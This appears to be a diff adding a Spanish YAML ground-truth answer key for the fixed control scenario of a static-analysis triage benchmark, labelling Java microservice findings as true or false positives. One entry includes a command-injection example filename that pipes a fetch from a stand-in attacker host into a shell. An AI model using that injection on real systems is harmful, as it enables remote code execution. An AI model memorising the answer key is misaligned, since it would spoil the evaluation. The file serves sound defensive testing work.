@@ -1,0 +1,126 @@
+# Verdad de terreno del escenario CORREGIDO (grupo de control).
+#
+# Es el mismo codigo que target/ con el fix aplicado a la cadena cross-service:
+#   * OrderController.getOrder compara order.ownerId() contra el llamante (403).
+#   * InternalUserController exige X-Internal-Token del servicio en vez de la
+#     cabecera X-Internal-Call que elegia el cliente.
+#
+# Lo demas no cambia, para que la unica diferencia entre escenarios sea el fix.
+# Aqui no hay ningun hallazgo explotable: cualquier PoC que "confirme" algo en
+# este escenario es una falsa confirmacion.
+#
+# Generado a partir de ground-truth.yml; ver test_escenarios.py.
+
+entradas:
+- rule_id: java.spring.idor-sin-verificacion-propiedad
+  archivo: user-service/src/main/java/com/seminario/user/InternalUserController.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-639
+  nota: 'Tras el fix, /internal/users exige el token de servicio (comparacion en tiempo constante) y la
+    propiedad del recurso ya la verifica order-service antes de llamarlo. Un llamante externo no puede
+    invocarlo: la regla de ausencia se dispara igual, pero ya no hay IDOR.'
+- rule_id: java.sqli.concatenacion-de-consulta
+  archivo: order-service/src/main/java/com/seminario/order/OrderRepository.java
+  etiqueta: verdadero_positivo
+  explotable: false
+  cwe: CWE-89
+  nota: 'Concatenacion real de SQL, pero el banco de pruebas no tiene motor SQL, asi que no es explotable
+    en runtime. Caso clave: verdadero positivo NO explotable.'
+- rule_id: java.crypto.hash-debil
+  archivo: order-service/src/main/java/com/seminario/order/AuthService.java
+  etiqueta: verdadero_positivo
+  explotable: false
+  cwe: CWE-327
+  nota: MD5 real usado para huella de token. Debilidad genuina, dificil de "explotar" como demo.
+- rule_id: java.secreto-embebido
+  archivo: order-service/src/main/java/com/seminario/order/AuthService.java
+  etiqueta: verdadero_positivo
+  explotable: false
+  cwe: CWE-798
+  nota: INTERNAL_API_TOKEN es un secreto embebido real en el codigo fuente.
+- rule_id: java.random-inseguro
+  archivo: order-service/src/main/java/com/seminario/order/OrderController.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-330
+  nota: Random se usa solo para un id de correlacion de trazas, sin funcion de seguridad. La regla es
+    ruidosa a proposito; el triaje debe descartarlo.
+- rule_id: java.ssrf.url-construida-por-concatenacion
+  archivo: order-service/src/main/java/com/seminario/order/UserClient.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-918
+  nota: La URL base es de configuracion y el segmento concatenado es un id interno, no una entrada de
+    atacante que permita cambiar de host. Falso positivo.
+- rule_id: java.log.dato-potencialmente-sensible
+  archivo: order-service/src/main/java/com/seminario/order/OrderController.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-532
+  nota: Se registra el id de usuario y un correlacion, no credenciales ni PII sensible. Hallazgo de bajo
+    valor que el triaje deberia degradar.
+- rule_id: java.random-inseguro
+  archivo: notification-service/src/main/java/com/seminario/notification/PasswordResetService.java
+  etiqueta: verdadero_positivo
+  explotable: false
+  cwe: CWE-330
+  nota: 'Aqui Random SI cumple una funcion de seguridad: genera el token de restablecimiento de clave.
+    java.util.Random es predecible a partir de pocas salidas, asi que un atacante puede anticipar enlaces
+    ajenos.'
+- rule_id: java.log.dato-potencialmente-sensible
+  archivo: notification-service/src/main/java/com/seminario/notification/PasswordResetService.java
+  etiqueta: verdadero_positivo
+  explotable: false
+  cwe: CWE-532
+  nota: 'El log incluye el token de restablecimiento completo: cualquiera con acceso a los logs puede
+    tomar la cuenta. Credencial en logs.'
+- rule_id: java.secreto-embebido
+  archivo: notification-service/src/main/java/com/seminario/notification/PasswordResetService.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-798
+  nota: 'Dos coincidencias, ambas ruido: PASSWORD_RESET_PATH es una ruta publica que se envia en el correo,
+    y la segunda es la regex atravesando el literal "token=" de la linea de log. Ninguna es una credencial.'
+- rule_id: java.ssrf.url-construida-por-concatenacion
+  archivo: notification-service/src/main/java/com/seminario/notification/WebhookController.java
+  etiqueta: verdadero_positivo
+  explotable: false
+  cwe: CWE-918
+  nota: 'SSRF real: callbackUrl llega del cliente y define el HOST de destino, y la respuesta se devuelve
+    al llamante. Permite leer servicios internos (por ejemplo /internal/users de user-service). No hay
+    PoC en el prototipo.'
+- rule_id: java.spring.idor-sin-verificacion-propiedad
+  archivo: notification-service/src/main/java/com/seminario/notification/TemplateController.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-639
+  nota: 'Las plantillas son un catalogo publico sin propietario: no hay nada que comparar contra el llamante.
+    La regla de ausencia se dispara igual.'
+- rule_id: java.sqli.concatenacion-de-consulta
+  archivo: notification-service/src/main/java/com/seminario/notification/TemplateRepository.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-89
+  nota: Se concatena TABLA, una constante del codigo. Ningun valor de usuario llega a la consulta.
+- rule_id: java.crypto.hash-debil
+  archivo: notification-service/src/main/java/com/seminario/notification/ContentHasher.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-327
+  nota: 'SHA-1 se usa para el ETag HTTP de contenido publico: solo detecta cambios para la cache. No protege
+    integridad frente a un atacante ni deriva secretos, asi que las colisiones no tienen impacto.'
+- rule_id: java.inyeccion-de-comandos
+  archivo: notification-service/src/main/java/com/seminario/notification/AttachmentController.java
+  etiqueta: verdadero_positivo
+  explotable: false
+  cwe: CWE-78
+  nota: 'nombreArchivo llega del cliente y se interpola en "sh -c": un nombre como "x; curl atacante|sh"
+    ejecuta comandos. Real; sin PoC en el prototipo.'
+- rule_id: java.inyeccion-de-comandos
+  archivo: notification-service/src/main/java/com/seminario/notification/ToolsHealthIndicator.java
+  etiqueta: falso_positivo
+  explotable: false
+  cwe: CWE-78
+  nota: 'ProcessBuilder con argumentos constantes ("pdftotext", "-v") y sin shell: no hay entrada que
+    controle un atacante.'
